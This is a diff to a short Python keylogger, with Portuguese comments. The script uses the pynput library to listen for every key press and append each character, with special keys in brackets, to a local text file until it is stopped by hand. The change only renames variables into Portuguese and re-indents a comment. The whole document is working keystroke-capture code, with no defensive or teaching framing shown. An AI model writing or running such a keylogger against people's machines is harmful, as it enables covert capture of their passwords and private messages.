@@ -2,20 +2,20 @@
 from pynput import keyboard
 
 # Nome do arquivo onde as teclas serão gravadas
-log_file = "log.txt"
+teclas = "teclas_pressionadas.txt"
 
 # Toda vez que uma tecla for pressionada
-def on_press(key):
+def ao_pressionar(tecla):
     try:
-        with open(log_file, "a") as file:
-            file.write(f"{key.char}")
+        with open(teclas, "a") as arquivo:
+            arquivo.write(f"{tecla.char}")
     except AttributeError:
-        # Se for uma tecla especial salvara com colchetes
-        with open(log_file, "a") as file:
-            file.write(f"[{key}]")
+# Se for uma tecla especial salvara com colchetes
+         with open(teclas, "a") as arquivo:
+            arquivo.write(f"[{tecla}]")
 
 # Inicia o "ouvinte" de teclas
-with keyboard.Listener(on_press=on_press) as listener:
-    listener.join()
+with keyboard.Listener(on_press=ao_pressionar) as registro:
+    registro.join()
     
 # O programa ficará rodando até ser interrompido manualmente
